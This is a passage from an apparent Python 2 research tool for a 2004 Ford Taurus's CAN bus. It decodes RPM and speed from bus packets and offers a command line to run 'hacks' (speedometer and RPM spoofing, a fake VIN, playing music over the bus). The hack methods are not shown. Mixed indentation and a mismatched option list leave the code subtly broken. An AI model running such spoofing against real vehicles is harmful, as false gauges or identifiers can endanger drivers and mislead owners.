                self.multiPacketSpit(packet0rts=True)

# read in 26 frames
# average them
# normalize to our range of values (conversion 1.6167*x-63.5
# x --> 0 to 120

#sample width = 2??
#number of frames: 7133184 
#number of channels: 2 
#sample width: 2 --> 2 bytes per sample
#framerate: 44100 

    def engineDiagnostic(self, data):
        self.client.serInit()
        self.spitSetup(500)	
        self.addFilter([513, 513, 513,513,513,513])
		
        startTime = tT.time()
        while((tT.time() - startTime ) < 15):
                packet = None;
        
       	 	#catch a packet to decode
        	while (packet == None):
        	    packet=self.client.rxpacket();
            
      	  	rpm = 64.5 * ord(packet[5]) - 61.88
      	  	mph = 1.617 * ord(packet[9]) - 63.5
                print "putting data in"
     	  	data.put("Engine RPM: %d Current Speed: %d mph\n"%(rpm, mph))
     	  	time.sleep(.5)
        


    
        
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description='''\

    Run Hacks on a Ford taurus 2004:
        
            speedometerHack
            fakeVIN
            rpmHack
        ''')
    parser.add_argument('verb', choices=['speedometerHack', 'rpmHack', 'thefifth']);
    parser.add_argument('-v', '--variable', type=int, action='append', help='Input values to the method of choice', default=None);


    args = parser.parse_args();
    inputs = args.variable
    fe = FordExperiments("../../contrib/ThayerData/");
    
    if( args.verb == 'speedometerHack'):
        fe.speedometerHack(inputs=inputs)
    if( args.verb == 'rpmHack'):
        fe.rpmHack(inputs=inputs)
    elif( args.verb == 'fakeVIN'):
        fe.fakeVIN()
    elif( args.verb == 'thefifth'):
        fe.imbeethovenbitch()
        
        
